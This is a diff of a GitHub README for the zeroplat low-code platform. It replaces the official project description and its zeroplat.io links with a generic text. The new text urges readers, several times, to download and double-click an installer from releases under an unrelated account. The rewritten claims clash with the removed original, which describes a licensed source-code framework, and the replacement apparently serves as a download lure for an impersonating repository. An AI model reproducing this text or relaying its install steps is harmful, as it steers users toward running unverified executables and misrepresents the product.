@@ -1,90 +1,81 @@
-![Zeroplat Visual Designer](https://github.com/zeroplat-io/zeroplat/blob/main/visual-designer.jpg)
-![Zeroplat Visual Designer](https://github.com/zeroplat-io/zeroplat/blob/main/visualdesigner2.png)
+# 🚀 zeroplat - Build Applications Effortlessly
 
-# Zeroplat 🚀  
-**Build apps faster with the next-gen Low-Code / No-Code Platform**
+[![Download Zeroplat](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Gladysgala/zeroplat/releases)
 
-Zeroplat is a powerful **Low-Code / No-Code development platform** that helps you design, build and deploy modern applications in minutes – without writing endless lines of code.  
-Whether you are a **startup**, **enterprise**, or **freelance developer**, Zeroplat saves you time, reduces cost, and accelerates innovation.
+## 🚀 Getting Started
 
-🌐 [Official Website](https://zeroplat.io) | 🎥 [Demo Videos](https://www.youtube.com/@zeroplatform) | 📖 [Documentation](https://docs.zeroplat.io) | ❓ [Ask a Question](https://ask.zeroplat.io)
+Welcome to zeroplat! This is a next-gen low-code and no-code platform. It's built using .NET and React, making it a great choice for creating web applications quickly. You don't need to know how to code. With zeroplat, anyone can build apps easily.
 
-<br>
+## 🌟 Key Features
 
-## ✨ Key Features
-- ⚡ **Visual App Builder** – drag-and-drop components to create pages, user components, dashboards, and workflows.  
-- 🔄 **Workflow / BPM Engine** – design approval flows, notifications, and business processes with zero coding.  
-- 🌍 **Multi-Tenant & Multi-Language** – manage unlimited tenants and customize language resources dynamically.  
-- 🛠️ **Marketplace Ready** – extend your apps with ready-made modules and components.  
-- 🔒 **Role & Permission System** – fine-grained control at role, user, and organization levels.  
-- 📊 **Custom Dashboards** – build real-time dashboards with charts, grids, and widgets.  
-- 🖥️ **.NET 9 / React 18** stack – modern, scalable, and enterprise-ready.  
+- **User-Friendly Interface**: Navigate the platform without any coding knowledge. 
+- **Full Source Code**: Get complete access to edit and customize your applications.
+- **Enterprise Ready**: Suitable for business-level projects and scaling.
+- **Integration Options**: Connect with various databases and services with ease.
 
-<br>
+## 📥 Download & Install
 
-## 🛠 Tech Stack
+To start using zeroplat, you need to download the application. Follow these simple steps:
 
-Zeroplat is built on a modern, enterprise-ready stack:
+1. **Visit the Releases Page**: Go to the [zeroplat releases](https://github.com/Gladysgala/zeroplat/releases) page.
+  
+2. **Choose Your Version**: Look for the latest version listed on the page.
+  
+3. **Download the File**: Click on the download link for your operating system to get the installer file. 
 
-- **Backend**
-  - [.NET 9 / ASP.NET Core](https://dotnet.microsoft.com/)  
-  - [ABP Framework](https://abp.io/) (modular architecture, multi-tenancy, OpenIddict)  
-  - [Entity Framework Core](https://learn.microsoft.com/en-us/ef/core/) (MS SQL, MySQL, PostgreSQL, SQLite support)  
-  - [OpenIddict](https://documentation.openiddict.com/) (authentication & authorization)  
-  - REST & GraphQL APIs  
+4. **Run the Installer**: After downloading, locate the file and double-click it to begin the installation.
 
-- **Frontend**
-  - [React 18](https://react.dev/)  
-  - [TypeScript](https://www.typescriptlang.org/)  
-  - [Vite.js](https://vitejs.dev/) (fast build system)  
-  - [Material-UI](https://mui.com/) + [DevExtreme](https://js.devexpress.com/) (UI components)  
-  - State management with Zustand & context 
+5. **Follow Setup Instructions**: The installer will guide you through the setup process.
 
-<br>
+6. **Launch zeroplat**: Once installed, you’ll find the zeroplat application in your programs menu. Open it to start creating your projects!
 
-## 🔍 Zeroplat vs Alternatives
+## 🖥️ System Requirements
 
-| Feature / Platform        | Zeroplat 🚀            | Retool | Appsmith | Tooljet | Superblocks | abp.io |
-|----------------------------|------------------------|--------|----------|---------|-------------|--------|
-| **Full Source Code**       | ✅ Included            | ❌     | ❌       | ❌      | ❌          | ✅     |
-| **Backend Stack**          | .NET 9 (ABP.io)        | NodeJS | NodeJS   | NodeJS  | Python      | .NET 9 |
-| **Frontend Stack**         | React 18 + TypeScript  | React  | React    | React   | React       | Angular|
-| **Self-Hosting**           | ✅ Yes                 | ✅     | ✅       | ✅      | ✅          | ✅     |
-| **Multi-Tenancy**          | ✅ Built-in            | ⚠️ Limited | ❌   | ❌      | ❌          | ✅     |
-| **Workflow / BPM Engine**  | ✅ Built-in            | ❌     | ❌       | ❌      | ❌          | ❌     |
-| **Dynamic Localization**   | ✅ Built-in            | ❌     | ❌       | ❌      | ❌          | ⚠️ Limited |
-| **Marketplace Modules**    | ✅ Yes                 | ❌     | ❌       | ❌      | ❌          | ❌     |
-| **Licensing**              | One-time fee + source  | SaaS   | SaaS     | SaaS    | SaaS        | Commercial |
-| **Target Users**           | Dev Teams / Enterprises| Startups| Startups| Startups| Startups    | .NET Devs |
+To ensure smooth performance, please check the following system requirements:
 
+- **Operating System**: Windows 10 or later, or macOS.
+- **Processor**: Dual-core processor or better.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: Have at least 1 GB of free space for installation.
+- **Internet Connection**: Required for downloading dependencies and updates.
 
+## 📚 Usage Instructions 
 
-✅ **Why Zeroplat?**  
-Unlike most SaaS-only platforms (Retool, Appsmith, Tooljet, Superblocks), Zeroplat provides **full source code, modular .NET backend, and enterprise-ready features** such as multi-tenancy, BPM/workflows, and marketplace extensibility.  
+After installing zeroplat, follow these steps to start building your application:
 
-<br>
+1. **Create a New Project**: Click on "New Project" to start your first application.
+  
+2. **Select Templates**: Choose from a variety of templates designed for different purposes—like business apps, personal projects, or dashboards.
 
-## 💼 Licensing & Packages
+3. **Drag and Drop Components**: Use the drag-and-drop feature to add components like buttons, forms, and tables.
 
-Zeroplat is offered in three packages with full source code included:
-Starter – For individual developers (up to 3 devs, single product)
-Team – For growing teams (up to 6 devs, up to 2 products)
-Enterprise – For larger organizations (up to 10 devs, 3+ products, private ticket support)
+4. **Customize Your App**: Modify properties such as colors and text to fit your vision. 
 
-👉 [Check Pricing & Purchase](https://zeroplat.io/pricing/)
+5. **Preview Your Work**: Use the preview feature to see how your app looks in real-time.
 
-<br>
+6. **Publish Your Application**: When you're ready, publish your app to share it with the world.
 
-## 🤝 Contributing
+## 🛠️ Community and Support
 
-We welcome community feedback!
-Open an issue or discussion to suggest features, improvements, or report bugs.
+If you need help while using zeroplat, here are some useful resources:
 
-<br>
+- **Discussion Forum**: Join our community forum to ask questions and share tips with other users.
+- **Documentation**: Access detailed documentation on features and usage scenarios [here](https://github.com/Gladysgala/zeroplat/wiki).
+- **Feedback**: We appreciate your feedback! Use the issue tracker on our GitHub page to report any bugs or suggest features.
 
-## 📬 Contact
-- 🌐 Website: [zeroplat.io](https://zeroplat.io)  
-- 📧 Email: info@zeroplat.io  
-- 💼 LinkedIn: [Zeroplat](https://www.linkedin.com/company/zeroplat)
-- 🎥 YouTube: [@zeroplatform](https://www.youtube.com/@zeroplatform)  
-- ❓ Ask a Question: [ask.zeroplat.io](https://ask.zeroplat.io)  
+## 🔗 Related Topics
+
+This platform relates to several topics that might interest you, including:
+
+- Low-Code Development
+- No-Code Solutions
+- Web Application Development
+- Business Process Management (BPM)
+
+Explore them to enhance your knowledge and usage of zeroplat.
+
+## 🏁 Final Thoughts
+
+zeroplat empowers users to build applications without any coding skills. Whether you are creating a simple project or a complex business app, zeroplat provides all the tools you need. Download and unleash your creativity today!
+
+[![Download Zeroplat](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Gladysgala/zeroplat/releases)
